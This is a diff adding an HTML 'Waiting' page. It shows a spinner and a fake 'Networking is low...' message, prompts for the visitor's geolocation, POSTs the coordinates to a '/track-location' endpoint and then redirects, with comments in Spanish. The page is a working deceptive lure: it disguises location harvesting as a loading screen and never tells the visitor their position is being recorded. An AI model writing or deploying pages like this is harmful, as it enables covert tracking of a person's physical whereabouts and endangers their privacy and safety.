@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Waiting</title>
+  <style>
+    .spinner {
+      border: 16px solid #f3f3f3;
+      border-radius: 50%;
+      border-top: 16px solid #3498db;
+      width: 120px;
+      height: 120px;
+      animation: spin 2s linear infinite;
+      margin: 100px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .message {
+      text-align: center;
+      font-family: Arial, sans-serif;
+      font-size: 1.2em;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <div class="message">Networking is low...</div>
+
+  <script>
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // Enviar la ubicación al backend
+          fetch('/track-location', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ latitude: lat, longitude: lon }),
+          })
+          .then(response => response.json())
+          .then(data => {
+            // Redirigir a la página deseada
+            window.location.href = data.redirectUrl;
+          })
+          .catch(error => console.error('Error:', error));
+        },
+        (error) => {
+          document.querySelector('.message').textContent = 'Failed to access.';
+          console.error('Error al obtener la ubicación:', error);
+        }
+      );
+    } else {
+      document.querySelector('.message').textContent = 'Geolocation is not supported by this browser.';
+      console.error('Geolocalización no soportada en este navegador.');
+    }
+  </script>
+</body>
+</html>
